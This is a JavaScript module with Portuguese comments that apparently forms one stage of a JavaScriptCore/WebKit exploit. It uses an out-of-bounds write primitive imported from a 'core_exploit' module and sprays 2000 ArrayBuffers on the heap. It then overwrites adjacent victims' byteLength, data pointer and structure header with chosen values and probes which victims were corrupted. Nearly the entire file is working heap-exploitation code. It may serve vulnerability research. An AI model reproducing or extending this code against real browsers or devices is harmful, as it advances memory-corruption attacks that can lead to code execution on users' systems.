// js/script3/testVictimABInstability.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // O buffer onde a escrita OOB acontece
    oob_write_absolute,
    clearOOBEnvironment,
    getBaseOffsetInDV,
    getOOBAllocationSize
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Função de inspeção direta (reutilizada da iteração anterior)
export function inspectArrayBufferState(victimBuffer, expectedVictimSize, corruptionDetails) {
    const FNAME_INSPECT = "inspectArrayBufferState";
    let report = {
        inspected_object_type: Object.prototype.toString.call(victimBuffer),
        is_still_array_buffer: false,
        current_byteLength: "N/A",
        byteLength_changed: false,
        dataview_ops_ok: false,
        dataview_error: null,
        notes: ""
    };

    logS3(`    [${FNAME_INSPECT}] Inspecionando vítima. Corrupção tentada: ${isAdvancedInt64Object(corruptionDetails.value) ? corruptionDetails.value.toString(true) : toHex(corruptionDetails.value)} @ ${toHex(corruptionDetails.offset_in_oob_buffer)}`, "info");

    if (report.inspected_object_type !== "[object ArrayBuffer]") {
        report.notes = `Vítima não é mais um ArrayBuffer! Tipo: ${report.inspected_object_type}`;
        logS3(`      CRÍTICO (Inspeção): ${report.notes}`, "critical", FNAME_INSPECT);
        return report;
    }
    report.is_still_array_buffer = true;

    try {
        report.current_byteLength = victimBuffer.byteLength;
        if (report.current_byteLength !== expectedVictimSize) {
            report.byteLength_changed = true;
            report.notes += `byteLength alterado de ${expectedVictimSize} para ${report.current_byteLength}. `;
            logS3(`      ANOMALIA (Inspeção): ${report.notes}`, "critical", FNAME_INSPECT);
        } else {
            // logS3(`    [${FNAME_INSPECT}] byteLength permanece ${report.current_byteLength}.`, "info");
        }

        const testDvLength = Math.min(typeof report.current_byteLength === 'number' ? report.current_byteLength : 0, 16);
        if (testDvLength >= 4) {
            const dv = new DataView(victimBuffer, 0, testDvLength);
            const writeVal = 0xABCDDCBA; // Valor diferente para não confundir com outros testes
            dv.setUint32(0, writeVal, true);
            if (dv.getUint32(0, true) === writeVal) {
                report.dataview_ops_ok = true;
            } else {
                report.dataview_error = "DataView R/W falhou (valor incorreto)";
                report.notes += "DataView R/W falhou (valor incorreto). ";
                logS3(`      CRÍTICO (Inspeção): ${report.dataview_error}`, "critical", FNAME_INSPECT);
            }
        } else {
            report.dataview_error = `byteLength (${report.current_byteLength}) muito pequeno para teste DataView.`;
            // Não necessariamente crítico se byteLength foi intencionalmente zerado pela corrupção.
            if (report.current_byteLength !== 0) { // Só é um problema real se não for 0
                 logS3(`      AVISO (Inspeção): ${report.dataview_error}`, "warn", FNAME_INSPECT);
            }
        }
    } catch (e) {
        report.dataview_error = `Exceção durante inspeção: ${e.name} - ${e.message}`;
        report.notes += `Exceção: ${e.message}. `;
        logS3(`      CRÍTICO (Inspeção): Exceção durante inspeção: ${e.name} - ${e.message}`, "critical", FNAME_INSPECT);
        console.error(e);
    }
    return report;
}


// Nova função principal para Estratégia 2
export async function runAllInstabilityTestsOnVictimAB() {
    const FNAME_RUNNER = "runHeapSprayAndCorruptStrategy";
    logS3(`==== INICIANDO Teste: Heap Spray + Corrupção de Vítima Adjacente ====`, "test", FNAME_RUNNER);

    const victim_size = 64; // Tamanho de cada ArrayBuffer vítima pulverizado
    const spray_count = 2000; // Número de vítimas a pulverizar
    const sprayed_victims = [];
    let overall_problem_found = false;

    // Offsets de escrita OOB DENTRO do oob_array_buffer_real.
    // Estes devem tentar "vazar" para uma vítima adjacente.
    // O oob_array_buffer_real tem (getBaseOffsetInDV() + getOOBAllocationSize() + 256) bytes.
    // O oob_dataview_real (a "janela") começa em getBaseOffsetInDV() e tem getOOBAllocationSize() bytes.
    // Queremos escrever perto do fim do oob_array_buffer_real.
    const oobBufferTrueEndOffset = getBaseOffsetInDV() + getOOBAllocationSize() + 256;

    // Parâmetros de corrupção: { nome, offset_no_oob_buffer, valor_escrita, tamanho_escrita }
    // Os offsets são absolutos dentro do oob_array_buffer_real.
    // Tentaremos atingir metadados de uma vítima que *poderia* estar após o oob_array_buffer_real.
    // Se uma vítima está em X, seu m_impl é X + HEADER + 0x10, m_byteLength é X + HEADER + 0x18.
    const JSCELL_HEADER_SIZE_GUESS = 8; // Ajuste conforme necessário (0, 8, 16)

    const corruption_params_to_try = [
        // Tentar atingir m_byteLength (0x18) de uma vítima adjacente
        { name: "Corromper m_byteLength da vítima adjacente para 0xFFFFFFFF",
          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),
          value: 0xFFFFFFFF, size: 4 },
        { name: "Corromper m_byteLength da vítima adjacente para 0",
          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),
          value: 0x00000000, size: 4 },
        { name: "Corromper m_byteLength da vítima adjacente para 256",
          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),
          value: 256, size: 4 },
        // Tentar atingir m_impl (0x10) de uma vítima adjacente
        { name: "Corromper m_impl da vítima adjacente para NULL",
          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16),
          value: new AdvancedInt64(0,0), size: 8},
        { name: "Corromper m_impl da vítima adjacente para BAD",
          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16),
          value: new AdvancedInt64(0xBADBAD00, 0xBADBAD00), size: 8},
        // Tentar uma escrita um pouco antes, para pegar o header da vítima
         { name: "Corromper header da vítima adjacente (StructureID?)",
          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16), // Ex: 0x00 ou 0x08
          value: 0xDEADBEEF, size: 4 },
    ];

    for (const params of corruption_params_to_try) {
        logS3(`\n[${FNAME_RUNNER}] Testando Parâmetros de Corrupção: ${params.name}`, "test", FNAME_RUNNER);
        logS3(`  Tentando escrever ${isAdvancedInt64Object(params.value) ? params.value.toString(true) : toHex(params.value)} (tam: ${params.size}) em offset ${toHex(params.offset_in_oob_buffer)} do oob_array_buffer_real`, "info", FNAME_RUNNER);

        // 1. Limpar e criar o buffer OOB principal
        clearOOBEnvironment();
        if (!triggerOOB_primitive()) {
            logS3("Falha crítica ao criar oob_array_buffer_real. Abortando.", "critical", FNAME_RUNNER);
            overall_problem_found = true; break;
        }
        logS3(`   oob_array_buffer_real criado/reutilizado. Tamanho total: ${oob_array_buffer_real.byteLength}`, "info", FNAME_RUNNER);

        // 2. Heap Spray das vítimas
        sprayed_victims.length = 0; // Limpar array de vítimas anterior
        logS3(`   Pulverizando ${spray_count} ArrayBuffers vítima de ${victim_size} bytes...`, "info", FNAME_RUNNER);
        for (let i = 0; i < spray_count; i++) {
            sprayed_victims.push(new ArrayBuffer(victim_size));
        }
        logS3(`   Pulverização concluída.`, "good", FNAME_RUNNER);
        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para estabilização do heap

        // 3. Realizar a escrita OOB no oob_array_buffer_real
        if (!oob_write_absolute(params.offset_in_oob_buffer, params.value, params.size)) {
            logS3("   Falha ao escrever valor de corrupção no oob_array_buffer_real.", "error", FNAME_RUNNER);
            continue; // Próximo parâmetro de corrupção
        }
        logS3("   Valor de corrupção escrito no oob_array_buffer_real com sucesso.", "good", FNAME_RUNNER);
        await PAUSE_S3(SHORT_PAUSE_S3);

        // 4. Sondar um subconjunto das vítimas pulverizadas
        logS3(`   Iniciando sondagem de ${Math.min(100, spray_count)} vítimas pulverizadas...`, "info", FNAME_RUNNER);
        let problem_found_for_this_param = false;
        const probe_sample_size = Math.min(100, spray_count); // Sondar até 100 vítimas
        const probe_step = Math.max(1, Math.floor(spray_count / probe_sample_size));

        for (let i = 0; i < spray_count; i += probe_step) {
            if (i >= spray_count) break;
            const victim_to_inspect = sprayed_victims[i];
            // logS3(`    Sondando vítima pulverizada index ${i}...`, "info", FNAME_RUNNER);

            const inspection_report = inspectArrayBufferState(
                victim_to_inspect,
                victim_size, // Tamanho original esperado da vítima
                { value: params.value, offset_in_oob_buffer: params.offset_in_oob_buffer } // Detalhes da corrupção tentada
            );

            if (!inspection_report.is_still_array_buffer ||
                inspection_report.byteLength_changed ||
                !inspection_report.dataview_ops_ok ||
                (inspection_report.dataview_error && !inspection_report.dataview_error.includes("muito pequeno"))) {
                logS3(`    PROBLEMA DETECTADO na vítima pulverizada index ${i} (ID log implícito)!`, "critical", FNAME_RUNNER);
                logS3(`      Detalhes da Inspeção: ${JSON.stringify(inspection_report)}`, "critical", FNAME_RUNNER);
                document.title = `PROBLEMA Vítima Spray (${isAdvancedInt64Object(params.value) ? params.value.toString(true).substring(0,10) : toHex(params.value)} @ ${toHex(params.offset_in_oob_buffer)}) VítimaIdx ${i}`;
                problem_found_for_this_param = true;
                overall_problem_found = true;
                break; // Para esta corrupção, achamos um problema, vamos para a próxima.
            }
        }
        if (!problem_found_for_this_param) {
            logS3(`   Nenhum problema óbvio detectado nas vítimas sondadas para estes params.`, "good", FNAME_RUNNER)
        }
         await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre diferentes parâmetros de corrupção
    } // Fim do loop corruption_params_to_try

    if (overall_problem_found) {
         logS3(`==== Teste Heap Spray CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
         document.title = "PROBLEMA(S) DETECTADO(S) - Heap Spray AB";
    } else {
        logS3(`==== Teste Heap Spray CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO NAS VÍTIMAS SONDADAS. ====`, "good", FNAME_RUNNER);
    }
    clearOOBEnvironment(); // Limpeza final
    sprayed_victims.length = 0; // Liberar referências
}
